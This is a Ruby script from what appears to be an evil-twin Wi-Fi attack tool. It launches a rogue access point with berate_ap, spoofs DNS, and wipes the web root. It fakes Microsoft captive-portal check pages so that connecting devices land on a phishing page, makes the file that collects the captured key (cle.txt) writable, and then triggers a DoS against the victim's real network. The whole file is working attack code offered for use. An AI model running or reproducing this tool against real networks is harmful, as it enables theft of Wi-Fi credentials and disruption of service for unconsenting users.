#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'
require './berateghzdos'




class Ghz
def self.berateGhz
load 'checkbis.rb'
system "berate_ap --mana-loud -n --redirect-to-localhost --ieee80211n -g 175.0.0.1 #{$carte} -c #{$canal} #{$ssid} &> /dev/null &"
sleep 20
piddnsspoofbis = spawn('dnsspoof -i ap0 &')
sleep 5
page = File.open("page.txt").readlines.each do |page|
  puts page
$page = page.chomp
puts "\e[1;94m[*] Configuracion del systemo de hotspot...\e[0m"
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF`
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
`mkdir generate_204`
sleep 1
Dir.chdir '/var/www/generate_204'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`mkdir msftconnecttest`
sleep 1
`mkdir msftnci`
sleep 1
Dir.chdir '/var/www/msftnci'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
Dir.chdir '/var/www'
sleep 1
`mkdir redirect`
sleep 1
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
Dir.chdir '/var/www/redirect'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
`cp -R /etc/#{$page}/* /var/www/msftconnecttest/`
sleep 3;
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
`chown -R root:www-data /var/www/*`
sleep 1
Dir.chdir '/var/www/msftconnecttest/shout'
sleep 1
`chown -R root:www-data /var/www/msftconnecttest/shout/chat.txt`
`chmod 764 /var/www/msftconnecttest/shout/chat.txt`
`chmod  777 *`
Dir.chdir '/var/www/msftconnecttest'
sleep 1
cle = "cle.txt"
if File.exist?("cle.txt")
`chmod 777 *`
`chown -R root:www-data /var/www/msftconnecttest/cle.txt`
`chmod 764 /var/www/msftconnecttest/cle.txt`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Falso AP iniciado... préparacion de la DoS...\e[0m"
Dir.chdir '/tmp/hostbase-1.4ES'
sleep 1
New.interface # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Falso AP iniciado... préparacion de la DoS...\e[0m"
Dir.chdir '/tmp/hostbase-1.4ES'
sleep 1 
New.interface # Lancement de la DoS ici et du code qui attend la victime
end
end
end
end
